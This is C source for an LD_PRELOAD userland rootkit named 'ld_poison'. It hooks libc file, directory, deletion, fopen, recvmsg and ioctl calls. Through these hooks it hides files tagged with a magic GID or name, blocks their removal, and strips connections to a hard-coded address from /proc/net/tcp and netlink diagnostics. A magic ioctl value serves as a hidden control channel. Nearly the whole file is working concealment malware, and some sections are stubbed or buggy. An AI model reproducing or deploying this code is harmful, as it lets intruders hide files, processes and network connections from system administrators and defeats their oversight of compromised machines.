#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>
#include "config.h"
#include "pcap-int.h"
#include <linux/netlink.h>
#include <linux/inet_diag.h>
#include <stdarg.h>
#include <linux/ioctl.h>
#include <linux/fcntl.h>

#include "dir.h"
#include "utils.h"
#include "network.h"

void* libc;
int control_flag = 0;


static void init (void) __attribute__ ((constructor));

static int (*old_fxstat)(int ver, int fildes, struct stat *buf);
static int (*old_fxstat64)(int ver, int fildes, struct stat64 *buf);
static int (*old_lxstat)(int ver, const char *file, struct stat *buf);
static int (*old_lxstat64)(int ver, const char *file, struct stat64 *buf);
static int (*old_open)(const char *pathname, int flags, mode_t mode);
static int (*old_rmdir)(const char *pathname);
static int (*old_unlink)(const char *pathname);
static int (*old_unlinkat)(int dirfd, const char *pathname, int flags);
static int (*old_xstat)(int ver, const char *path, struct stat *buf);
static int (*old_xstat64)(int ver, const char *path, struct stat64 *buf);

static DIR *(*old_fdopendir)(int fd);
static DIR *(*old_opendir)(const char *name);

static struct dirent *(*old_readdir)(DIR *dir);
static struct dirent64 *(*old_readdir64)(DIR *dir);

FILE *(*old_fopen64)(const char *file, const char *mode);
FILE *(*old_fopen)(const char *file, const char *mode);

ssize_t (*old_recvmsg)(int __fd, struct msghdr *__message, int __flags);
int (*old_ioctl)(int sock, unsigned long cmd, char *arp);

int *(*old_pcap_dispatch)(pcap_t *p, int cnt, pcap_handler callback, u_char *user);

static int *(*old_pcap_read_linux_mmap_v3)(pcap_t *handle, int max_packets, pcap_handler callback, u_char *user);
static int (*old_pcap_handle_packet_mmap)(pcap_t *handle, pcap_handler callback, u_char *user, unsigned char *frame, unsigned int tp_len, unsigned int tp_mac, unsigned int tp_snaplen, unsigned int tp_sec, unsigned int tp_usec, int tp_vlan_tci_valid, __u16 tp_vlan_tci, __u16 tp_vlan_tpid);

void init(void)
{
	debug("[-] ld_poison loaded.\n");

	old_fxstat = dlsym(RTLD_NEXT, "__fxstat");
	old_fxstat64 = dlsym(RTLD_NEXT, "__fxstat64");
	old_lxstat = dlsym(RTLD_NEXT, "__lxstat");
	old_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
	old_open = dlsym(RTLD_NEXT,"open");
	old_rmdir = dlsym(RTLD_NEXT,"rmdir");
	old_unlink = dlsym(RTLD_NEXT,"unlink");	
	old_unlinkat = dlsym(RTLD_NEXT,"unlinkat");
	old_xstat = dlsym(RTLD_NEXT, "__xstat");
	old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
	
	old_fdopendir = dlsym(RTLD_NEXT, "fdopendir");
	old_opendir = dlsym(RTLD_NEXT, "opendir");
	
	old_readdir = dlsym(RTLD_NEXT, "readdir");
	old_readdir64 = dlsym(RTLD_NEXT, "readdir64");

	old_recvmsg = dlsym(RTLD_NEXT, "recvmsg");

	old_pcap_handle_packet_mmap = dlsym(RTLD_NEXT, "pcap_handle_packet_mmap");
	old_pcap_dispatch = dlsym(RTLD_NEXT, "pcap_dispatch");
	old_pcap_read_linux_mmap_v3 = dlsym(RTLD_NEXT, "pcap_read_linux_mmap_v3");

	old_fopen64 = dlsym(RTLD_NEXT, "fopen64");
	old_fopen = dlsym(RTLD_NEXT, "fopen");
	old_ioctl = dlsym(RTLD_NEXT, "ioctl");
	
	load_hide_info();
}

void load_hide_info()
{
    int fd = shm_open(SHM_NAME, O_CREAT | O_RDWR, 0666);
    if (fd < 0) {
        perror("Error creating shared memory object");
        return -1;
    }

    ftruncate(fd, DATA_STZE);
    void *addr = mmap(NULL, DATA_STZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
	
    int data_count = (((int)((char *)addr)[0]) << 8) + (int)((char *)addr)[1];
    struct data *ptr = (struct data *)(addr + 2 + sizeof(struct file_data));
    struct file_data *file = (struct file_data *)(addr + 2);
    debug("file: %s\n", file->filename);
	add_hide_file_paths(file);
    int i;
    for (i = 0; i<data_count; i++)
    {
        switch (ptr[i].type) {
        case PROC_DATA:
            debug("process: %d\n", ptr[i].payload.proc.pid);
            break;
        case CONN_DATA:
            network_hide_add(ptr[i].payload.conn.addr);
			debug("ip : %d  port: %d \n", ptr[i].payload.conn.addr.sin_addr.s_addr, ptr[i].payload.conn.addr.sin_port);
            break;
        }
    }

    munmap(addr, DATA_STZE);	
}

int fstat(int fd, struct stat *buf)
{
	struct stat s_fstat;

	debug("fstat hooked.\n");

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat(_STAT_VER, fd, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}

	return old_fxstat(_STAT_VER, fd, buf);
}

int fstat64(int fd, struct stat64 *buf)
{
	struct stat64 s_fstat;


	debug("fstat64 hooked.\n");


	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat64(_STAT_VER, fd, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
	
	return old_fxstat64(_STAT_VER, fd, buf);
}

int __fxstat(int ver, int fildes, struct stat *buf)
{
	struct stat s_fstat;


	debug("__fxstat hooked.\n");


	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat(ver,fildes, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
	return old_fxstat(ver,fildes, buf);
}

int __fxstat64(int ver, int fildes, struct stat64 *buf)
{
	struct stat64 s_fstat;


	debug("__fxstat64 hooked.\n");


	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat64(ver, fildes, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}

	return old_fxstat64(ver, fildes, buf);
}

int lstat(const char *file, struct stat *buf)
{
	struct stat s_fstat;
	debug("lstat hooked.\n");
	memset(&s_fstat, 0, sizeof(stat));
	old_lxstat(_STAT_VER, file, &s_fstat);

	if(is_name_invisible2(file) || is_name_invisible(file)) {
		errno = ENOENT;
		return -1;
	}
	return old_lxstat(_STAT_VER, file, buf);
}

int lstat64(const char *file, struct stat64 *buf)
{
	struct stat64 s_fstat;


	debug("lstat64 hooked.\n");


	memset(&s_fstat, 0, sizeof(stat));

	old_lxstat64(_STAT_VER, file, &s_fstat);

	if(is_name_invisible2(file) || is_name_invisible(file)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat64(_STAT_VER, file, buf);
}

int __lxstat(int ver, const char *file, struct stat *buf)
{
	struct stat s_fstat;

	
	debug("__lxstat hooked.\n");
	memset(&s_fstat, 0, sizeof(stat));
	old_lxstat(ver, file, &s_fstat);

	if(is_name_invisible2(file) || is_name_invisible(file)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat(ver, file, buf);
}

int __lxstat64(int ver, const char *file, struct stat64 *buf)
{
	struct stat64 s_fstat;

	
	debug("__lxstat64 hooked.\n");
	

	memset(&s_fstat, 0, sizeof(stat));

	old_lxstat64(ver, file, &s_fstat);
	
	
	debug("File: %s\n",file);
	debug("GID: %d\n",s_fstat.st_gid);
	
	
	if(is_name_invisible2(file) || is_name_invisible(file)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat64(ver, file, buf);
}

int open(const char *pathname, int flags, mode_t mode)
{
	struct stat s_fstat;
	debug("open hooked.\n");

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(_STAT_VER, pathname, &s_fstat);
	
	if(is_name_invisible2(pathname) || is_name_invisible(pathname)) {
		errno = ENOENT;
		return -1;
	}

	return old_open(pathname,flags,mode);
}

int rmdir(const char *pathname)
{
	struct stat s_fstat;
	
	
	debug("rmdir hooked.\n");
	
	
	memset(&s_fstat, 0, sizeof(stat));
	
	old_xstat(_STAT_VER, pathname, &s_fstat);
	
	if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL) || (strstr(pathname, CONFIG_FILE) != NULL)) {
		errno = ENOENT;
		return -1;
	}
	
	return old_rmdir(pathname);
}

int stat(const char *path, struct stat *buf)
{
	struct stat s_fstat;

	
	debug("stat hooked\n");
	

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(_STAT_VER, path, &s_fstat);
	
	
	debug("Path: %s\n",path);
	debug("GID: %d\n",s_fstat.st_gid);
	
	
	if(is_name_invisible2(path) || is_name_invisible(path)) {
		errno = ENOENT;
		return -1;
	}

	return old_xstat(3, path, buf);
}

int stat64(const char *path, struct stat64 *buf)
{
	struct stat64 s_fstat;

	
	debug("stat64 hooked.\n");
	

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat64(_STAT_VER, path, &s_fstat);

	if(is_name_invisible2(path) || is_name_invisible(path)) {
		errno = ENOENT;
		return -1;
	}

	return old_xstat64(_STAT_VER, path, buf);
}

int __xstat(int ver, const char *path, struct stat *buf)
{
	struct stat s_fstat;

	
	debug("xstat hooked.\n");
	

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(ver,path, &s_fstat);

	
	debug("Path: %s\n",path);
	debug("GID: %d\n",s_fstat.st_gid);
	 
	
	memset(&s_fstat, 0, sizeof(stat));

	if(is_name_invisible2(path) || is_name_invisible(path)) {
		errno = ENOENT;
		return -1;
	}

	return old_xstat(ver,path, buf);
}

int __xstat64(int ver, const char *path, struct stat64 *buf)
{
	struct stat64 s_fstat;
	
	
	debug("xstat64 hooked.\n");
	

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat64(ver,path, &s_fstat);

	
	debug("Path: %s\n",path);
	debug("GID: %d\n",s_fstat.st_gid);
	 

	if(is_name_invisible2(path) || is_name_invisible(path)) {
		errno = ENOENT;
		return -1;
	}
	
	return old_xstat64(ver,path, buf);
}

int unlink(const char *pathname)
{
	struct stat s_fstat;
	
	
	debug("unlink hooked.\n");
	
	
	memset(&s_fstat, 0, sizeof(stat));
	
	old_xstat(_STAT_VER, pathname, &s_fstat);
	
	if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL) || (strstr(pathname, CONFIG_FILE) != NULL)) {
		errno = ENOENT;
		return -1;
	}
	
	return old_unlink(pathname);
}

int unlinkat(int dirfd, const char *pathname, int flags)
{
	struct stat s_fstat;
	
	
		debug("unlinkat hooked.\n");
	
	
	memset(&s_fstat, 0, sizeof(stat));
	
	old_fxstat(_STAT_VER, dirfd, &s_fstat);
	
	if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL) || (strstr(pathname, CONFIG_FILE) != NULL)) {
		errno = ENOENT;
		return -1;
	}
	
	return old_unlinkat(dirfd, pathname, flags);
}

DIR *fdopendir(int fd)
{
	struct stat s_fstat;

	
	debug("fdopendir hooked.\n");
	

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat(_STAT_VER, fd, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return NULL;
	}

	return old_fdopendir(fd);
}

DIR *opendir(const char *name)
{
	struct stat s_fstat;

	
	debug("opendir hooked.\n");
	

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(_STAT_VER, name, &s_fstat);

	if(is_name_invisible2(name) || is_name_invisible(name)) {
		errno = ENOENT;
		return NULL;
	}

	return old_opendir(name);
}

struct dirent *readdir(DIR *dirp)
{
	struct dirent *dir;
	struct stat s_fstat;
	
	memset(&s_fstat, 0, sizeof(stat));

	
	debug("readdir hooked.\n");

	do {
		dir = old_readdir(dirp);
		
		if (dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0)) 
			continue;

		if(dir != NULL) {
	                char path[PATH_MAX + 1];
			sndebug(path,PATH_MAX,"/proc/%s",dir->d_name);
	                old_xstat(_STAT_VER, path, &s_fstat);
		}
	} while(dir && (is_name_invisible(dir->d_name) != 0 || is_name_invisible2(dir->d_name) != 0 || s_fstat.st_gid == MAGIC_GID));

	return dir;
}

struct dirent64 *readdir64(DIR *dirp)
{
	struct dirent64 *dir;
	struct stat s_fstat;
	
	memset(&s_fstat, 0, sizeof(stat));

	
	debug("readdir64 hooked.\n");
	

	do {
		dir = old_readdir64(dirp);
		
		if (dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0))  
			continue;

		if(dir != NULL) {
	                char path[PATH_MAX + 1];
			debug(path,PATH_MAX,"/proc/%s",dir->d_name);
	                old_xstat(_STAT_VER, path, &s_fstat);
		}
        } while(dir && (strstr(dir->d_name, MAGIC_DIR) != 0 || strstr(dir->d_name, CONFIG_FILE) != 0 || s_fstat.st_gid == MAGIC_GID));
	
	return dir;
}	

int is_procnet(const char *filename) {
	debug("is_procnet\n");
	char *proc_net_tcp = "/proc/net/tcp";
	char *proc_net_tcp6 = "/proc/net/tcp6";

	
	if (strcmp (filename, proc_net_tcp) == 0
		|| strcmp (filename, proc_net_tcp6) == 0) {
		return 1;
	}
	return 0;
}

FILE *hide_ports(const char *filename) {
	debug("hide_ports called\n");
	char line[LINE_MAX];
	char *proc_net_tcp = "/proc/net/tcp";
	char *proc_net_tcp6 = "/proc/net/tcp6";

	unsigned long rxq, txq, time_len, retr, inode;
	int local_port, rem_port, d, state, uid, timer_run, timeout;
	char rem_addr[128], local_addr[128], more[512];

	FILE *tmp = tmpfile();
	FILE *pnt = old_fopen64(filename, "r"); 

	while (fgets(line, LINE_MAX, pnt) != NULL) {
		char *scanf_line = "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s";
		sscanf(line,
    			scanf_line,
		 	&d, local_addr, &local_port, rem_addr, &rem_port, &state,
		 	&txq, &rxq, &timer_run, &time_len, &retr, &uid, &timeout, &inode, more);

		if (strcmp(rem_addr,"BE08A8C0")==0)
			continue;
		else{
			fputs(line, tmp);
		}
		debug("%d %d \n", local_addr, local_port);
	}	
	
	fclose(pnt);
	fseek(tmp, 0, SEEK_SET);
	return tmp;
}

int ioctl(int sock, unsigned long cmd, char *arg)
{
	debug("ioctl hook \n");
	int ret = 0;
	unsigned int pid;
	struct control *args;
	struct sockaddr_in addr;
	unsigned char pid_ishide[5]; 

	if (cmd == AUTH && arg == HTUA) {
		if (control_flag) {
			control_flag = 0;
		} else {
			control_flag = 1;
		}
		return 0;
	}
	if (control_flag && cmd == AUTH) {
		// memset(&args, arg, sizeof(struct control ));
		args = (struct control *)arg;
		debug("cmd %d \n", args->cmd);
		switch (args->cmd)
		{
		case 0:
			// add_hide_file_paths(args->argv);
			break;
		case 1:
			// strncpy(pid_ishide, args->argv, 5);
			memcpy(pid_ishide, args->argv, 5);
			pid_t pid = ((unsigned int*) pid_ishide)[0];
			debug("%u \n", pid);
			// if( pid_ishide[4] == 1)
				// add_proc(pid);
			// if( pid_ishide[4] == 0)
				// del_proc(pid);
			
			// add_proc(pid);
			break;
		case 2:
			break;
		case 3:
			break;
		case 4:
			memcpy(&addr, args->argv, sizeof(struct sockaddr_in));
			// add_addr(addr);
			break;
		case 5:
			memcpy(&addr, args->argv, sizeof(struct sockaddr_in));
			// del_addr(addr);
			break;
		case 6:
			// update_file(args->argv);
			break;
		case 7:
			// update_file("");
			break;
		default:
			break;
		}
	}
out:
    return old_ioctl(sock, cmd, arg);
}

int is_procss(const char *filename) {
	debug("is_procss \n");
	char *proc_ss = "/proc/sys/net/ipv4/ip_local_port_range";

	
	if (strcmp (filename, proc_ss) == 0) {
		return 1;
	}
	return 0;
}

FILE *hide_ss(const char *filename) {
	debug("hide_ss called\n");
	char line[LINE_MAX];

	unsigned long rxq, txq, time_len, retr, inode;
	int local_port, local_addr;

	FILE *tmp = tmpfile();
	FILE *pnt = old_fopen64(filename, "r"); 

	while (fgets(line, LINE_MAX, pnt) != NULL) {
		char *scanf_line = "%d %d";
		sscanf(line,
    			scanf_line,
		 	 &local_addr, &local_port);

		// if (strcmp(rem_addr,"BE08A8C0")==0)
		// 	continue;
		// else{
			fputs(line, tmp);
		// }
		debug("%d %d \n", local_addr, local_port);
		debug("%d \n",line);
	}	
	
	fclose(pnt);
	fseek(tmp, 0, SEEK_SET);
	return tmp;
}

FILE *fopen(const char  *file, const char *mode)
{
	debug("fopen hook: %s  mode :%s \n", file, mode);

	if (!old_fopen)
	{
		old_fopen = dlsym(RTLD_NEXT, "fopen");
	}

	return old_fopen(file, mode);
}

FILE *fopen64(const char  *file, const char *mode)
{
	debug("fopen64 hook : %s  mode :%s \n", file, mode);

	if (!old_fopen64)
	{
		old_fopen64 = dlsym(RTLD_NEXT, "fopen64");
	}
	if(is_procnet(file))
	{
		return hide_ports(file);
	}
	if (is_procss(file))
	{
		return hide_ss(file);
	}
	return old_fopen64(file, mode);
}

ssize_t recvmsg(int __fd, struct msghdr *__message, int __flags)
{
	debug("recvmsg hook \n");
	if (!old_recvmsg)
	{
		old_recvmsg = dlsym(RTLD_NEXT, "recvmsg");
	}

	int status =  old_recvmsg(__fd, __message, __flags);
	if (!__message->msg_iov->iov_len)
		return status;

	struct nlmsghdr *nlh = (struct nlmsghdr *)__message->msg_iov->iov_base;
	int count = status;
	char *stream;
	int found = 1, i, offset;

	if (status <= 0)
		return status;

	while (NLMSG_OK(nlh, status)) {
		if (found == 0)
			nlh = NLMSG_NEXT(nlh, count);

			/* NLMSG_NEXT: Many netlink protocols have request messages that result
			   in multiple response messages. In these cases, multiple responses will
			   be copied into the `msg` buffer. This macro can be used to walk the
			   chain of responses. Returns NULL in the event the message is the last
			   in the chain for the given buffer. */
		struct inet_diag_msg *r = NLMSG_DATA(nlh);

		if (!((r->id.idiag_dport == 23569 && r->id.idiag_dst[0] == 3188238528 ) || 
			(r->id.idiag_sport == 23569 && r->id.idiag_dst[0] == 3188238528 ))){
			found = 0;
			continue;
		}
		
		/* Message contains data to be masked */
		found = 1;

		stream = (char *) nlh;

		/* NLMSG_ALIGN: This macro accepts the length of a netlink message and rounds it
		   up to the nearest NLMSG_ALIGNTO boundary. It returns the rounded length. */
		offset = NLMSG_ALIGN((nlh)->nlmsg_len);

		/* Copy remaining entries over the data to be masked */
		for (i=0 ; i<count ; i++)
			stream[i] = stream[i + offset];

		/* Adjust the data length */
		status -= offset;
	}
	return status;
}

int pcap_dispatch(pcap_t *p, int cnt, pcap_handler callback, u_char *user)
{
	return old_pcap_dispatch(p,  cnt,  callback,  user);
}

static int pcap_read_linux_mmap_v3(pcap_t *handle, int max_packets, pcap_handler callback, u_char *user)
{
	return old_pcap_read_linux_mmap_v3(handle, max_packets, callback, user);
}

static int pcap_handle_packet_mmap(pcap_t *handle, pcap_handler callback, u_char *user, unsigned char *frame, unsigned int tp_len, unsigned int tp_mac, unsigned int tp_snaplen, unsigned int tp_sec, unsigned int tp_usec, int tp_vlan_tci_valid, __u16 tp_vlan_tci,
		__u16 tp_vlan_tpid)
{
	struct dp_handle *handle_user = (struct dp_handle *)user;
	struct dpargs *args = (struct dpargs *)handle_user->userdata;
	debug("%x",args->ip_src.s_addr);
	return old_pcap_handle_packet_mmap(
		  handle
		, callback
		, user
		, frame
		, tp_len
		, tp_mac
		, tp_snaplen
		, tp_sec
		, tp_usec
		, tp_vlan_tci_valid
		, tp_vlan_tci
		, tp_vlan_tpid);
}

